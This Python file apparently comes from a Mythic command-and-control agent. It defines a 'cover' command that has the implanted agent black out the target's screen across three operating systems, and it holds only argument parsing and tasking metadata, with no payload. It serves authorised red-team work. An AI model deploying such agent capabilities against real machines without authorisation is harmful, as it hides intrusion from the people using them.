import shlex

from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class CoverArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):

        if len(self.command_line.strip()) == 0:
            raise ValueError("Really - what are you doing? Give me a truthy value (not zero is on)")

        args = shlex.split(self.command_line)

        self.add_arg("state", args[0], ParameterType.Number)


class CoverCommand(CommandBase):
    cmd = "cover"
    needs_admin = False
    help_cmd = "cover {state}"
    description = "Request the agent fill the screen with a black rectangle"
    version = 1
    author = "@ArchiMoebius"
    attackmapping = []
    argument_class = CoverArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.MacOS, SupportedOS.Linux, SupportedOS.Windows],
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        state = "on" if  task.args.get_arg("state") != 0 else "off"
        task.display_params = f'is {state}'
        return task

    async def process_response(self, response: AgentResponse):
        pass
